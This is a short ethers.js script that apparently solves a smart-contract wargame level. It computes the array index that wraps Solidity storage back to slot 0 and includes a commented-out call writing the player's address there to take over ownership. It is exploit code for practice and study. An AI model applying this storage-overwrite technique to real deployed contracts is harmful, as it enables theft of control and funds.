import { BigNumber, ethers } from "ethers";

// Dynamic array storage starts at keccak(length slot)
// and is contiguous afterwards
const dynamicArrayStartSlot = BigNumber.from(
  ethers.utils.keccak256("0x" + "0".repeat(63) + "1")
);

// To overwrite the value in the first storage slot, we write to
// array[slotsToWrapAround]
const slotsToWrapAround = BigNumber.from("0x" + "f".repeat(64))
  .sub(dynamicArrayStartSlot)
  .add(1);

console.log(BigNumber.from(slotsToWrapAround));
// 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a

// await contract.revise(
//   "0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a",
//   "0x" + "0".repeat(24) + player.slice(2)
// );
